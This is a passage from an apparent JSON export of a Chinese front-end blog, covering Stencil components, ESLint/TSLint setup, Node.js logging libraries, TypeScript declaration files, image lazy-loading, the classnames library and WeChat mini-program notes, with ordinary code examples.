'@stencil/core';export class TodoList &#123; @Prop() activated: boolean; // 默认值 @Prop() name: string = 'Stencil'; // 可以内部改变 props @Prop(&#123; mutable: true &#125;) name: string = 'Stencil'; // 双向数据绑定 @Prop(&#123; reflectToAttr: true &#125;) title: string = 'Props'; // 当 activated 更新时，watchHandler 就会执行。 @Watch('activated') watchHandler(newValue: boolean, oldValue: boolean) &#123; console.log('The new value of activated is: ', newValue); &#125; // 使用 @Element 获取本组件的引用，返回的是 HTMLElement 实例。 @Element() todoListEl: HTMLElement; addClass() &#123; this.todoListEl.classList.add('active'); &#125; // 使用 @Method 装饰后，就会变成一个“公共的方法”，并且挂载在元素上。 @Method() showPrompt() &#123; // const todoListElement = document.querySelector('todo-list'); // todoListElement.showPrompt(); &#125; // 自定义的组件事件 // &lt;todo-list onTodoCompleted=&#123;ev =&gt; this.someMethod(ev)&#125;&gt;&lt;/todo-list&gt; @Event() todoCompleted: EventEmitter; todoCompletedHandler(todo: Todo) &#123; this.todoCompleted.emit(todo); &#125; // 监听 body 的滚动事件 @Listen('body:scroll') handleScroll(ev) &#123; console.log('the body was scrolled', ev); &#125;&#125; Shadow DOMShadow DOM 是内置于浏览器中的 API，可用于 DOM 封装和样式封装。Shadow DOM 将我们的组件与外界隔离开来，这意味着我们不需要考虑诸如正确地对我们的 css 进行范围映射，或者担心内部 ​​DOM 受到组件外部世界的干扰。 12345678@Component(&#123; tag: 'shadow-component', styleUrl: 'shadow-component.scss', shadow: true // shadow dom 模式&#125;)export class ShadowComponent &#123; // ...&#125; 表单这是一个基本的表单处理示例。 12345678910111213141516171819202122import &#123; Component, State &#125; from '@stencil/core';@Component(&#123; tag: 'app', styleUrl: 'app.css',&#125;)export class MyComponent &#123; @State() value: string = 'Aers'; onChange = e =&gt; &#123; this.value = e.target.value; &#125; render() &#123; return ( &lt;div&gt; Name: &lt;input value=&#123;this.value&#125; onInput=&#123;this.onChange&#125; /&gt; &lt;p&gt;Name: &#123;this.value&#125;&lt;/p&gt; &lt;/div&gt; ); &#125;&#125; 组件引入由于组件会编译成 HTML，所以不需要使用 import 引入组件。只需要编写组件的 tag 名称，Stencil 会自动分析目录，找出组件的形态。 123456789101112131415161718192021222324252627// a.tsximport &#123; Component, Prop &#125; from '@stencil/core';@Component(&#123; tag: 'a-component',&#125;)export class AComponent &#123; @Prop name: string = ''; render() &#123; return &lt;div&gt; &#123;this.name&#125; &lt;/div&gt;; &#125;&#125;// b.tsximport &#123; Component &#125; from '@stencil/core';@Component(&#123; tag: 'b-component',&#125;)export class BComponent &#123; render() &#123; return ( &lt;div&gt; &lt;a-component name=\"小明\" /&gt; &lt;/div&gt; ); &#125;&#125; 路由stencil-router：受 React Router v4 启发的简单路由器，果然 …… 小结Stencil 是一个小而美的框架，Stencil 有 React 的身影又有 Vue 的身影，在有着不错的包大小与性能，在语法上支持 JSX，这是一个不错的框架。 在 build 之后的加载情况，如图： 参考资料 https://stenciljs.com/docs/introduction/","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"ESLint 与 TSLint 的使用","slug":"ECMAScript/ESLint 与 TSLint 的使用","date":"2018-05-18T08:10:17.000Z","updated":"2021-06-15T06:10:52.813Z","comments":true,"path":"/stories/2018/05/ECMAScript/ESLint 与 TSLint 的使用/","link":"","permalink":"http://me.lizhooh.com/stories/2018/05/ECMAScript/ESLint 与 TSLint 的使用/","excerpt":"前言ESLint 和 TSLint 都是 Javascript 的语法检查器，通常使用 ESLint 或 TSLint 用于解决团队开发上不同代码风格所带来的一系列不和谐的问题。","text":"前言ESLint 和 TSLint 都是 Javascript 的语法检查器，通常使用 ESLint 或 TSLint 用于解决团队开发上不同代码风格所带来的一系列不和谐的问题。 ESLint安装 ESLint：npm install -g eslint。 ESLint 支持几种格式的配置文件： JavaScript：使用 .eslintrc.js 然后输出一个配置对象。 YAML：使用 .eslintrc.yaml 或 .eslintrc.yml 去定义配置的结构。 JSON：使用 .eslintrc.json 去定义配置的结构，ESLint 的 JSON 文件允许 JavaScript 风格的注释。 (弃用)：使用 .eslintrc，可以使 JSON 也可以是 YAML。 package.json：在 package.json 里创建一个 eslintConfig 属性，在那里定义你的配置。 PS：我个人比较喜欢使用 .eslintrc.yml 文件。 通常配置的时候会安装一些公用的配置项。例如：安装 Airbnb 语法规则，以及 import、a11y、react 插件等。 12345yarn add --dev eslint-config-airbnb \\ eslint-plugin-import \\ eslint-plugin-jsx-a11y \\ eslint-plugin-react \\ babel-eslint 之后填写一些配置： 12345678&#123; \"parser\": \"babel-eslint\", \"extends\": [\"eslint:recommended\", \"eslint-config-airbnb\"], \"rules\": &#123; \"semi\": [\"error\", \"always\"], \"quotes\": [\"error\", \"double\"] &#125;&#125; 这是 YAML 版本的： 123456789101112---parser: babel-eslintextends: - eslint:recommended - eslint-config-airbnbrules: semi: - error - always quotes: - error - double 在这里，extends 指的是继承这个配置，rules 是规则项，会覆盖上面继承的配置，一般来说，对于别人不好的配置项，会根据自己的习惯与喜好做一下修改。 semi 和 quotes 是 ESLint 中 规则 的名称。第一个值是错误级别，可以使下面的值之一： off 或 0 - 关闭规则。 warn 或 1 - 将规则视为一个警告（不会影响退出码）。 error 或 2 - 将规则视为一个错误（退出码为 1）。 在配置完成后启动检查： 12eslint index.js # 某个文件eslint src/* # 某个目录 ESLint 配置项说明： root：限定配置文件的使用范围。 parser：指定 eslint 的解析器。 parserOptions：设置解析器选项。 extends：指定 eslint 规范。 plugins：引用第三方的插件。 env：指定代码运行的宿主环境。 rules：启用额外的规则或覆盖默认的规则。 globals：声明在代码中的自定义全局变量。 推荐几个有意思的 ESLint 配置： https://www.npmjs.com/package/eslint-config-react-app https://www.npmjs.com/package/eslint-plugin-vue 在 Vscode 上可以安装 ESLint 插件，进行自动的代码检查。同时可以使用 .eslintignore 指定那些文件不需要检查： 123/build//config//dist/ ESLint + Webpack很多时候，并不是直接跑 eslint index.js 这样的方式去检查的，而是结合 Webpack 使用，在 Webpack 编译前做一次检查，正如很多搭手架内置的 ESLint 一样。 那么如何把 ESLint 与 Webpack，实际上配置一下 loader 即可。 1234567891011const createLintingRule = () =&gt; (&#123; test: /\\.(js|jsx)$/, loader: 'eslint-loader', enforce: 'pre', include: [resolve('src'), resolve('test')], // 指定检查的目录 options: &#123; // 指定错误报告的格式规范 formatter: require('eslint-friendly-formatter'), emitWarning: !config.dev.showEslintErrorsInOverlay &#125;&#125;); 此外在 .eslintrc 里： 123456root: true # 防止不同目录下的 .eslintrc 无效parserOptions: parser: babel-eslint # 指定 eslint 的解析器为 babel-eslintenv: # 指定一下环境 browser: true node: true TSLintTSLint 是配合 Typescript 来使用的。 可以分几步使用，配置基本和 ESLint 差不多，具体看文档吧。 1234567npm install tslint typescriptcd path/to/projecttslint --inittslint -c tslint.json 'src/**/*.ts' 同样，在 Vscode 上安装 TSLint 插件可以自动检查。 React Native 配置需要安装： 1yarn add --dev babel-eslint eslint-plugin-react eslint-plugin-react-native 12345678parser: babel-eslintplugins: - react - react-nativeecmaFeatures: jsx: trueenv: react-native/react-native: true React Hooks 配置需要安装： 1yarn add --dev eslint-plugin-react-hooks@next 12plugins: - react-hooks 参考资料 http://eslint.cn/ https://palantir.github.io/tslint/","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"Nodejs 日志管理方案","slug":"Nodejs/Nodejs 日志管理方案","date":"2018-05-17T06:35:35.000Z","updated":"2021-06-15T06:10:52.840Z","comments":true,"path":"/stories/2018/05/Nodejs/Nodejs 日志管理方案/","link":"","permalink":"http://me.lizhooh.com/stories/2018/05/Nodejs/Nodejs 日志管理方案/","excerpt":"前言开发过程中，日志记录是必不可少的事情，尤其是生产系统中经常无法调试，因此日志就成了重要的调试信息来源。在 Nodejs 里使用日志管理，可以简单到只输出到控制台，也可以复杂到集成到系统里面。 目前来说对日志系统有以下的要求： 每行日志都需要有准确无误的时间戳，能够输出都多个输出流上。 日志格式容易被人理解同时也容易被计算机进行分析处理。 允许配置不同的日志输出，比如对于不同级别的日志配置不同的处理方式。","text":"前言开发过程中，日志记录是必不可少的事情，尤其是生产系统中经常无法调试，因此日志就成了重要的调试信息来源。在 Nodejs 里使用日志管理，可以简单到只输出到控制台，也可以复杂到集成到系统里面。 目前来说对日志系统有以下的要求： 每行日志都需要有准确无误的时间戳，能够输出都多个输出流上。 日志格式容易被人理解同时也容易被计算机进行分析处理。 允许配置不同的日志输出，比如对于不同级别的日志配置不同的处理方式。 下面介绍了三个（log4j、bunyan、winston）日志管理库都能满足。 自造轮子篇自己造轮子的话，需要充分使用 http、fs 等模块。 以 Koa 中间件为示例： 123456789101112131415161718192021/** * 某个自造的小日志管理中间件。 */const logger = (options) =&gt; async (ctx, next) =&gt; &#123; const opts = &#123; file: false, console: true, ...options, &#125;; // ip 方法（状态） url 时间 const start = Date.now(); await next(); const end = Date.now(); console.log( ctx.req.connection.remoteAddress, ctx.method, '(' + ctx.status ')', ctx.url, end - start&#125; + ' ms' );&#125; 这里，只是一个小小的中间件，把日志输出到控制台，造轮子好麻烦。 log4js 篇Log4j 是 Apache 的一个开源项目，一个很出名的日志管理模块。现在可以在 Nodejs 里使用 log4js 来管理后端日志。 基本使用来看一下下面的代码怎么回事。 123456789101112131415161718192021222324const log4js = require('log4js');// 一些配置log4js.configure(&#123; appenders: &#123; log: &#123; type: 'file', // 日志类型，有 type、console 等 filename: './logs/log/info.log', // 日志输出的文件位置 &#125;, api: &#123; type: 'file', filename: './logs/log/api.log', &#125;, console: &#123; type: 'console', // 会输出控制台哦 &#125; &#125;, categories: &#123; api: &#123; appenders: ['api'], level: 'info' &#125;, // 会文件记录而输出控制台 log: &#123; appenders: ['log', 'console'], level: 'info' &#125;, default: &#123; appenders: ['log', 'console'], level: 'info' &#125; &#125;&#125;); 说明：在这里定义了几个日志分类，包括了：api，log，default。其中 level 指的是日志的等级，低于某个等级就不会记录了。例如：log.debug(&#39;xxx&#39;)，在 info 等级下，这段日志是不会被记录的。 当需要使用时，先是取一个分类，如果输出内容。 123const apilog = log4js.getLogger('api');apilog.log('xxx'); 这时，会在 api.log 里看到日志信息。 集成到 Koa 里集成到 Koa 里，可以自己写中间件也可以使用第三方的中间。有一个现成的 koa-log4 中间件，可以使用。 12345678const klog = require('koa-log4');// 日志router.use(klog.koaLogger(klog.getLogger('log'), &#123; format: `\":remote-addr\" :method(:status) :url :content-lengthb`&#125;));// [2018-05-16T14:30:54.035] [INFO] log - \"::ffff:127.0.0.1\" GET(200) /api/v0/ 15b bunyan 篇与 log4js 类似的还有 node-bunyan，也是一个不错的日志管理模块。 12345678910const bunyan = require('bunyan');const log = bunyan.createLogger(&#123; name: 'foo', // 名称 streams: [&#123; path: '/var/log/foo.log', // 输出到 foo.log 文件里 &#125;]&#125;);log.info('hi');log.warn(&#123;lang: 'fr'&#125;, 'au revoir'); winston 篇Winston 是 Nodejs 最流行的日志框架之一，设计为一个简单通用的日志库，支持多传输（在 Winston 中，一个传输实质上代表储存设备，也就是数据最终保存在哪里），每个 Winston 实例都可以对不同级别的日志配置不同的传输。 最基本的方式是使用 Winston 模块输出的默认日志对象实例。 12345678910const winston = require('winston');const logger = winston.createLogger(&#123; level: 'info', // 级别 format: winston.format.json(), // 格式 transports: [ // 输出方式 // error 会输出到 error.log 这个文件里 new winston.transports.File(&#123; filename: 'error.log', level: 'error' &#125;), new winston.transports.File(&#123; filename: 'combined.log' &#125;) ]&#125;); 如何选择？有什么好选择的，哪个用着顺手就用哪个呗，反正我用 Log4j。 参考资料 https://github.com/log4js-node/log4js-node https://github.com/winstonjs/winston https://github.com/trentm/node-bunyan","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"如何优雅的编写 d.ts 文件？","slug":"Typescript/如何优雅的编写 index.d.ts 文件？","date":"2018-05-13T01:46:44.000Z","updated":"2021-06-15T06:10:52.897Z","comments":true,"path":"/stories/2018/05/Typescript/如何优雅的编写 index.d.ts 文件？/","link":"","permalink":"http://me.lizhooh.com/stories/2018/05/Typescript/如何优雅的编写 index.d.ts 文件？/","excerpt":"前言d.ts 是 Typescript 的描述文件，通常用于描述摸个函数/库的接口类型，在 vscode 里看见的智能提示，就是由 d.ts 驱动的，很多库都有写 d.ts 文件，因此在智能提示上没什么问题。 d.ts 文件通常会在包内，或者是 @types 里，例如 koa 的 d.ts 文件是发布在 @types/koa 里。 npm 包捆绑在一起。 @types organization。","text":"前言d.ts 是 Typescript 的描述文件，通常用于描述摸个函数/库的接口类型，在 vscode 里看见的智能提示，就是由 d.ts 驱动的，很多库都有写 d.ts 文件，因此在智能提示上没什么问题。 d.ts 文件通常会在包内，或者是 @types 里，例如 koa 的 d.ts 文件是发布在 @types/koa 里。 npm 包捆绑在一起。 @types organization。 全局类型全局类型是定义在全局作用域里的，就像 settimeout 一样。 通常使用 declare 来声明，并没有定义的作用。 变量的声明比较简单，唯一有点不同的是常量的声明。 123declare let a: numberdeclare let b: number | stringdeclare const max: 200 函数的声明，不需要函数体。只需要写明参数与返回值即可。 12/** id 是用户的 id，可以是 number 或者 string */decalre function getName(id: number | string): string 有时候同一个函数有若干种写法： 12declare function get(id: string | number): stringdeclare function get(name:string, age:number): string 类的声明是大部分的变量与函数组成。 123456789declare class Person &#123; static maxAge: number // 静态变量 static getMaxAge(): number // 静态方法 constructor(name: string, age: number) // 构造函数 getName(id: number | string): string getName(id: string, name: string): string&#125; 对象的声明有点特别，需要使用 namespace。 1234567891011121314151617181920212223declare namespace OOO &#123; let a: number | string function getName(id: number | string): string interface LogOptions &#123; verbose?: boolean; &#125; interface AlertOptions &#123; modal: boolean; title?: string; color?: string; &#125; class Person &#123; static maxAge: number static getMaxAge(): number constructor(name: string, age: number) getName(id: number): string &#125;&#125; 对象里面套对象也是可以的。 1234567declare namespace OOO &#123; let a: number | string // ... namespace O2 &#123; let b: number &#125;&#125; 一个类型，可以是混合类型的。 123456789declare function $(s: string): voiddeclare namespace $ &#123; let a: number&#125;// 调用$('a');$.a = 10; 对于接口来说，直接声明。 123456789101112131415161718// 实例方法interface People &#123; name: string age: number getName(): string getAge():number&#125;interface People_Static &#123; // 构造函数 new (name: string, age: number): People // 静态函数 staticA(): number // 函数 (w: number): number&#125;declare var People: People_Static 模块假设写了一个模块叫 name。 12345678910111213declare module \"name\" &#123; export let a: number export function b(): number export namespace c &#123; let cd: string &#125;&#125;// 调用const name = require('name');name.a = 1;name.b();name.c.cd = 'abc'; 通常会统一的到处一个默认的模块，而不是全局声明。 123export const name = '';export class A &#123; &#125;;export default function(a: number, b: number): any; 示例1234import &#123; Middleware &#125; from 'koa';declare function KoaLogger(): Middleware;declare namespace KoaLogger &#123; &#125;;export = KoaLogger; // 导出 @types如果某个库，在包里没有包括 index.d.ts 文件，去尝试寻找 @types 组织里有没有对应的描述文件。大多数情况下，类型声明包的名字总是与它们在 npm 上的包的名字相同，但是有 @types/前缀， 也可以在 https://aka.ms/types 这里查找相应的库。 参考资料 https://www.tslang.cn/docs/handbook/declaration-files/by-example.html","categories":[{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/categories/Typescript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/tags/Typescript/"}]},{"title":"图片懒加载（lazyload）模式的实现","slug":"React/React/图片懒加载的实现","date":"2018-05-10T03:57:00.000Z","updated":"2021-06-15T06:10:52.880Z","comments":true,"path":"/stories/2018/05/React/React/图片懒加载的实现/","link":"","permalink":"http://me.lizhooh.com/stories/2018/05/React/React/图片懒加载的实现/","excerpt":"前言往往在大型 Web 应用里图片资源加载是非常影响性能的，当一个页面有许多图片时，就不应该一次性把它所有的加载，这样一来会浪费带宽，二来会影响前端性能。那么可以尝试对图片使用懒加载模式，这是需要应用的一个优化点，像淘宝、京东、网易精选等有长列表且多图片的页面里都是使用了图片懒加载模式。 下面就来看看，图片的懒加载模式是如何实现的，以及在 React 里如何实现。","text":"前言往往在大型 Web 应用里图片资源加载是非常影响性能的，当一个页面有许多图片时，就不应该一次性把它所有的加载，这样一来会浪费带宽，二来会影响前端性能。那么可以尝试对图片使用懒加载模式，这是需要应用的一个优化点，像淘宝、京东、网易精选等有长列表且多图片的页面里都是使用了图片懒加载模式。 下面就来看看，图片的懒加载模式是如何实现的，以及在 React 里如何实现。 图片懒加载实现原理 什么是图片懒加载模式？ 通俗的讲就是：当访问一个页面的时候，先把 img 元素或是其他元素的背景图片路径替换成一张大小为 1*1px 图片的路径或者是很小的 Base64 编码图片（这样只请求一次），只有当图片出现在浏览器的可视区域内时，才设置图片正真的路径，让图片显示出来。这就是图片懒加载。 大致的实现思路是：将 img 的 src 用占位图片地址代替，当页面滚动直至此图片出现在可视区域时，把真实的图片地址赋值给 src。看是很简单的实现，实际上最难的就是计算图片是否在可视区里面。 通常会使用 data-original 来记录真实的图片地址，或者有些是使用 data-url、data-src 等。 1&lt;img src=\"占位地址\" data-original=\"真实地址\" /&gt; 通常会使用到的属性： 页可见区域宽/高： document.body.clientWidth/clientHeight 网页可见区域宽/高： document.body.offsetWidth/offsetHeight 网页正文全文宽/高： document.body.scrollWidth/scrollHeight 滚动条顶端位置： document.body.scrollTop 网页正文部分上： window.screenTop 屏幕分辨率的宽/高： window.screen.width/height 屏幕可用工作区高度： window.screen.availHeight 一般来说，都会忽略水平的可视区计算。 那么如何计算是否进入可视区？说难也不难，说简单有不简单。主要是通过监听滚动条的位置，判断滚动条的位置与当前元素的位置是否重叠。 好，下面就来实现一个简单的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;style&gt; img &#123; transition: all 0.5s ease-in-out; background-color: #f54; box-shadow: 0 5px 12px rgba(1, 1, 1, 0.12); margin: 10px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"height: 2000px\"&gt;Hello&lt;/div&gt; &lt;div&gt; &lt;img src=\"https://timgsa.baidu.com/timg\" data-original=\"http://news.cri.cn/mmsource/images/2014/08/13/39c47e1e55ff4bd3a692069057d96937.jpg\" style=\"height: 300px; width: auto;\" /&gt; &lt;img src=\"https://timgsa.baidu.com/timg\" data-original=\"http://news.cri.cn/mmsource/images/2014/08/13/db52bdf2802a4ef191233ff00698dbd4.jpg\" style=\"height: 300px; width: auto;\" /&gt; &lt;/div&gt;&lt;script&gt; window.onload = e =&gt; &#123; const imgs = document.querySelectorAll('img'); for (let i = 0; i &lt; imgs.length; i++) &#123; const top = imgs[i].getBoundingClientRect().top; imgs[i].top = top; // 图片说在位置 imgs[i].flag = false; // 标记是否设置了真实的 src &#125; window.addEventListener('scroll', e =&gt; &#123; const ch = document.documentElement.clientHeight || document.body.clientHeight; const t = document.documentElement.scrollTop || document.body.scrollTop; for (let i = 0; i &lt; imgs.length; i++) &#123; // 替换真实的 src if (ch + t - 100 &gt; imgs[i].top &amp;&amp; !imgs[i].flag) &#123; imgs[i].src = imgs[i].dataset.original; imgs[i].flag = true; &#125; &#125; &#125;); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 首先，获取每个 img 的说在位置顶部的距离，根据滚动条情况比较是否达到这个距离，到达之后设置其 src，完成一次懒加载。 React 图片懒加载关于 React 的实现，可以看这篇文章：lazy-load，里面已经讲得很清楚了 下面是一个使用 react-lazyload 实现的示例。 1234567891011121314151617181920import React, &#123; Component &#125; from 'react';import LazyLoad from 'react-lazyload';const src = 'http://news.cri.cn/mmsource/images/2014/08/13/39c47e1e55ff4bd3a692069057d96937.jpg';class App extends Component &#123; render() &#123; return ( &lt;div className=\"App\"&gt; &lt;p style=&#123;&#123; height: 2000 &#125;&#125;&gt; Hello world &lt;/p&gt; &lt;LazyLoad height=&#123;700&#125; offset=&#123;100&#125; once=&#123;true&#125;&gt; &lt;div style=&#123;&#123; height: 700 &#125;&#125;&gt; &lt;img src=&#123;src&#125; /&gt; &lt;/div&gt; &lt;/LazyLoad&gt; &lt;/div&gt; ); &#125;&#125; 大概说一下思路，因为 React 是动态渲染的，所以在图片没有到可视区域时，先渲染一个固定大小的 div。差不多到可视区域时，再把它渲染成 img，这样依赖连 src 都不用换了。 还可以基于 vanilla-lazyload 集成，来看看咋弄。 初始化项与目安装： 123create-react-app my-appcd my-appyarn add vanilla-lazyload 之后，在 jsx 里添加 img，lazyload 需要根据 data-src 来获取真实地址的。 123456&lt;img src=\"https://timgsa.baidu.com/timg\" data-src=\"http://news.cri.cn/mmsource/images/2014/08/13/39c47e1e55ff4bd3a692069057d96937.jpg\" style=&#123;&#123; height: 300, width: 'auto' &#125;&#125; alt=\"\" /&gt; 之后，在 dom 加载完成后初始化。 1234const LazyLoad = require('vanilla-lazyload');window.addEventListener('load', e =&gt; &#123; window.lazyLoad = new LazyLoad();&#125;); 如果使用动态插入 img，那么渲染完成后需要调用 update() 方法。 12345678910this.setState(&#123; view: ( &lt;img src=\"https://timgsa.baidu.com/timg\" data-src=\"http://news.cri.cn/mmsource/images/2014/08/13/db52bdf2802a4ef191233ff00698dbd4.jpg\" style=&#123;&#123; height: 300, width: 'auto' &#125;&#125; alt=\"\" /&gt; ),&#125;, () =&gt; window.lazyLoad.update()); 因为 vanilla-lazyload 是非响应式的，当动态插入 img 时，它并不知道，所以需要手动更新。 参考资料 https://www.javascriptstuff.com/react-image-gallery/ https://w33ble.github.io/understanding-react/demos/lazy-load.html https://www.cnblogs.com/flyromance/p/5042187.html https://www.andreaverlicchi.eu/lazyload","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"💅 ClassNames 在 React 上的应用","slug":"React/Style/ClassNames 在 React 上的应用","date":"2018-05-09T02:13:25.000Z","updated":"2021-06-15T06:10:52.884Z","comments":true,"path":"/stories/2018/05/React/Style/ClassNames 在 React 上的应用/","link":"","permalink":"http://me.lizhooh.com/stories/2018/05/React/Style/ClassNames 在 React 上的应用/","excerpt":"前言在 Vue 里有一个动态的 class 语法，很好的根据条件动态设置 class。例如： 1&lt;div class=\"button\" :class=\"&#123; active: show &#125;\"&gt;&lt;/div&gt; 就是当 show 为 true 时，此标签被赋予 active 样式。 在 React 要实现这样功能，可能会这样做： 1&lt;div className=&#123;`button $&#123;show ? 'active' : ''&#125;`&#125;&gt;&lt;/div&gt; 注意到，这里只有一个属性判断，如果有多个时会显得非常麻烦，那么现在使用 ClassNames 这个库来解决这个问题。","text":"前言在 Vue 里有一个动态的 class 语法，很好的根据条件动态设置 class。例如： 1&lt;div class=\"button\" :class=\"&#123; active: show &#125;\"&gt;&lt;/div&gt; 就是当 show 为 true 时，此标签被赋予 active 样式。 在 React 要实现这样功能，可能会这样做： 1&lt;div className=&#123;`button $&#123;show ? 'active' : ''&#125;`&#125;&gt;&lt;/div&gt; 注意到，这里只有一个属性判断，如果有多个时会显得非常麻烦，那么现在使用 ClassNames 这个库来解决这个问题。 基本使用ClassNames 是一个高性能、简便的用户根据条件动态设置 className 的 Javascript 库。 它的使用非常简单，来看看下面的几种使用方式。（自己也可以开发一个类似的库，不过没必要再造轮子） 12345678910111213141516import classNames from 'classnames';classNames('foo', 'bar'); // =&gt; 'foo bar'classNames('foo', &#123; bar: true &#125;); // =&gt; 'foo bar'classNames(&#123; 'foo-bar': true &#125;); // =&gt; 'foo-bar'classNames(&#123; 'foo-bar': false &#125;); // =&gt; ''classNames(&#123; foo: true &#125;, &#123; bar: true &#125;); // =&gt; 'foo bar'classNames(&#123; foo: true, bar: true &#125;); // =&gt; 'foo bar'// 多级嵌套，多参数classNames('foo', &#123; bar: true, duck: false &#125;, 'baz', &#123; quux: true &#125;);// =&gt; 'foo bar baz quux'// !! 为 false 的将被忽略classNames(null, false, 'bar', undefined, 0, 1, &#123; baz: null &#125;, '');// =&gt; 'bar 1' 好了到这里基本已经学会如何使用了，但是还有更多的高级内容等待着。 动态属性名在 ES6 下，可以使用动态对象 key，来设置跟强大的动态 className。 12const buttonType = 'primary';classNames(&#123; [`btn-$&#123;buttonType&#125;`]: true &#125;); 去重 dedupe使用 dedupe 版本的 classNames 可以正确地对类进行重复数据删除，并确保在后面的参数中指定的错误类从结果集中排除。dedupe 会慢（约5倍），因此它是作为选择提供的（在默认是不会去重的）。 1234import classNames from 'classnames/dedupe';classNames('foo', 'foo', 'bar'); // =&gt; 'foo bar'classNames('foo', &#123; foo: false, bar: true &#125;); // =&gt; 'bar' 映射 bind如果您使用 css-modules 或类似的方法来抽象类“名称”以及 className 实际输出到 DOM 的真实值，那么要使用 bind 版本。 1234567891011import classNames from 'classnames/bind';// 映射关系const styles = &#123; foo: 'abc', bar: 'def', baz: 'xyz'&#125;;const cx = classNames.bind(styles);const className = cx('foo', ['bar'], &#123; baz: true &#125;); //（1） =&gt; \"abc def xyz\"// const className = cx('abc', ['def'], &#123; xyz: true &#125;); （2） 这里什么意思呢？实际上就是把 foo 与 abc 产生映射，也就是说 （1） 和 （2） 两条语句是等效的，好处就像是定义一些常量一样。 在 React 上使用摘自 antd 的源码，通常会附带 prefix 定义 class。 123456789const prefixCls = 'alter';const classs = classNames(prefixCls, &#123; [`$&#123;prefixCls&#125;-$&#123;type&#125;`]: true, [`$&#123;prefixCls&#125;-close`]: !this.state.closing, [`$&#123;prefixCls&#125;-with-description`]: !!description, [`$&#123;prefixCls&#125;-no-icon`]: !showIcon, [`$&#123;prefixCls&#125;-banner`]: !!banner,&#125;, className); 扩展此外还有同类的库：classcat。这是一个类似 ClassNames 的轻量级实现，因为少了一些功能，性能还不错。 12345678910111213141516171819Classcat – Strings × 11,992,788 ops/secclassNames – Strings × 3,615,118 ops/secFastest is Classcat – StringsClasscat – Objects × 15,036,351 ops/secclassNames – Objects × 3,631,691 ops/secFastest is Classcat – ObjectsClasscat – Strings &amp; Objects × 9,677,306 ops/secclassNames – Strings &amp; Objects × 3,405,325 ops/secFastest is Classcat – Strings &amp; ObjectsClasscat – Mixed × 5,186,675 ops/secclassNames – Mixed × 2,487,460 ops/secFastest is Classcat – MixedClasscat – Arrays × 3,225,468 ops/secclassNames – Arrays × 818,056 ops/secFastest is Classcat – Arrays 参考资料 https://github.com/JedWatson/classnames https://www.npmjs.com/package/classcat","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"笔记 · 小程序开发杂记","slug":"小程序/笔记 · 小程序开发杂记","date":"2018-04-30T08:45:49.000Z","updated":"2021-06-15T06:10:52.915Z","comments":true,"path":"/stories/2018/04/小程序/笔记 · 小程序开发杂记/","link":"","permalink":"http://me.lizhooh.com/stories/2018/04/小程序/笔记 · 小程序开发杂记/","excerpt":"前言记录微信小程序开发的一些杂笔记 …… 本地数据持久化本地数据持久化（storage），小程序提供了异步（storage）与同步（storageSync）的 API。原生 api 参差不齐，推荐使用笔者封装的微信小程序 storage 封装库：wxapp-store。 提供了以下特性： 简洁的 api。 支持 async/await，promise 语法。 支持基础数据类型存储：object、array、string、number、boolean 支持正则表达式类型存储。 与原生接口保持一致的性能。","text":"前言记录微信小程序开发的一些杂笔记 …… 本地数据持久化本地数据持久化（storage），小程序提供了异步（storage）与同步（storageSync）的 API。原生 api 参差不齐，推荐使用笔者封装的微信小程序 storage 封装库：wxapp-store。 提供了以下特性： 简洁的 api。 支持 async/await，promise 语法。 支持基础数据类型存储：object、array、string、number、boolean 支持正则表达式类型存储。 与原生接口保持一致的性能。 1234567891011121314151617const Store = require('wxapp-store'); // 具体路径指定定位const store = new Store(&#123; wx &#125;); // 必须指定 wx 对象+ async function() &#123; await store.set('a', 1); console.log(await store.get('a')); // 1 await store.set('b', [1, 2, 3]); console.log(await store.get('b')); // [1, 2, 3] await store.set('c', /url=.*/gi); console.log(await store.get('c')); // /url=.*/gi console.log(await store.info()); await store.remove('c'); await store.clear();&#125; (); 路由切换路由切换使用 &lt;navigator&gt; 标签或 wx.navigateTo(options) 函数。 路由之间的数据传递可以通过 query 传递，或者全局变量等。 例如： 123456// ... 当前页url: 'home?data=' + JSON.stringify(&#123; name: 'xiao ming' &#125;),// ... 目标页onLoad(query) &#123; console.log(query.data); 